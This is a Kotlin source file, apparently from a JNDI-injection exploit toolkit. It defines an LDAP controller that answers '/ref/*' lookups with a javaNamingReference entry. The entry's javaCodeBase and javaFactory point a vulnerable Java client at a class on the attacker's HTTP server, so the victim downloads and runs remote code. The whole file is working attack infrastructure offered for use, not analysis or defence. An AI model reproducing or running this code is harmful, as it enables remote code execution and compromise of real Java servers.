package ldap.controllers

import util.Options
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import util.currentTime
import java.net.URL

@LDAPMapping(["/ref/*"])
class RemoteReference : Controller {
    val classloaderUrl = "http://${Options.address}:${Options.httpPort}/"

    override fun sendResult(result: InMemoryInterceptedSearchResult, base: String) {
        val entry = Entry(base)
        val javaFactory = base.substringAfterLast("/")

        val url = URL("$classloaderUrl$javaFactory.class")
        println("${currentTime()} [LDAPSERVER] Redirecting to $url")
        entry.run {
            addAttribute("javaClassName", "foo")
            addAttribute("javaCodeBase", classloaderUrl)
            addAttribute("objectClass", "javaNamingReference")
            addAttribute("javaFactory", javaFactory)
        }
        result.run {
            sendSearchEntry(entry)
            setResult(LDAPResult(0, ResultCode.SUCCESS))
        }
    }
}
